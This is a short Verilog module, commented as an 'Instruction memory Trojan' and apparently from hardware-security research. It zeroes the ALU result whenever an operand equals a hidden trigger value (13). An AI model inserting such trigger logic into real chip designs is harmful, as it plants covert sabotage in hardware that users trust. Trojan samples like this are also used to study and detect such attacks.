`timescale 1ns/1ns
	

//Instruction memory Trojan
	
module trj_ALU_prime #(n = 32, prime_num = 13) 
			(input [n-1:0] op1, ALU_out,
			output [n-1:0] result);
			
		assign result = (op1==prime_num)? {n{1'b0}} : ALU_out;
	
endmodule